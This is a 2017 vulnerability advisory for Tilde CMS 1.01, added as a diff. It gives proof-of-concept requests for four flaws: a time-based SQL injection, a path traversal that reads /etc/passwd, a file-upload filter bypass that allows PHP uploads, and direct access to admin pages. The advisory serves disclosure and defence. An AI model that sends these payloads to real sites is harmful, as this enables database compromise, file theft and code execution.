@@ -1,0 +1,99 @@
+# Exploit Title: Tilde CMS 1.01 Multiple Vulnerabilities
+# Date: July 7th, 2017
+# Exploit Authors: Paolo Forte, Raffaele Forte <raffaele@backbox.org>
+# Vendor Homepage: http://www.tildenetwork.com/
+# Version: Tilde CMS 1.0.1
+# Tested on: Ubuntu 12.04, PHP 5.3.10
+
+
+I. INTRODUCTION
+========================================================================
+Tilde CMS is closed-source content management system created by 
+tildenetwork.com
+
+
+II. DESCRIPTION
+========================================================================
+The web application suffers of multiple vulnerabilities.
+
+1. SQL Injection
+------------------------------------------------------------------------
+Due to missing escaping of the backtick character, the following query in 
+the source code is vulnerable:
+
+[class.SystemAction.php]
+
+	$SQL_string = "SELECT * FROM `form_table_".$id_form."` WHERE ID='$idForm'";
+	$SQL_oldData = @mysql_query($SQL_string,$this->DB_conn);
+
+The vulnerability can be trigged via a POST request as shown in the
+following PoC: 
+
+	POST /actionphp/action.input.php HTTP/1.1
+
+	ActionForm=SendForm&TotalQuery=653&TotalCompiled=2&id=1` WHERE 
+	SLEEP(5)-- aaa &idForm=1234567890
+
+The resulting query on the server-side will be:
+	SELECT * FROM `form_table_1` WHERE SLEEP(5)-- aaa ` WHERE ID='1234567890'
+
+For a succesful exploitation, the table "form_table_1" must be valid.
+
+
+2. Path Traversal
+------------------------------------------------------------------------
+The vulnerabilty exists on this method:
+
+	GET /actionphp/download.File.php?&file=../../../../../../etc/passwd
+
+
+3. Arbitrary Files Upload
+------------------------------------------------------------------------
+It is possible to bypass the implemented restrictions shown in the 
+following snippet of the code:
+
+	$file=$_FILES['file'.$i]['tmp_name'];
+	if (($file!="")&&($file!="none")) {
+		$source_file=$file;
+		$file_name=$_FILES['file'.$i]['name'];
+		$file_name=str_replace(".php",".txt",$file_name);
+		$file_name=str_replace(" ","_",$file_name);
+		$file_name=str_replace("+","",$file_name);
+
+A file named "filename.+php" will be renamed in "filename.php", therefore 
+successfully uploaded.
+
+
+4. Insecure Direct Object References
+------------------------------------------------------------------------
+It is possible to retrieve sensitive resources by using direct references.
+A low privileged user can load the PHP resources such as: 
+
+	admin/content.php
+	admin/content.php?method=ftp_upload
+
+
+IV. BUSINESS IMPACT
+========================================================================
+These flaws may compromise the integrity of the system and/or expose 
+sensitive information.
+
+
+V. SYSTEMS AFFECTED
+========================================================================
+Tilde CMS 1.01 is vulnerable (probably all previous versions)
+
+
+VI. VULNERABILITY HISTORY
+========================================================================
+July 6th, 2017: Vulnerability identification
+July 7th, 2017: Vendor notification
+July 13th, 2017: Vendor notification
+
+
+VII. LEGAL NOTICES
+========================================================================
+The information contained within this advisory is supplied "as-is" with 
+no warranties or guarantees of fitness of use or otherwise. We accept no
+responsibility for any damage caused by the use or misuseof this 
+information.
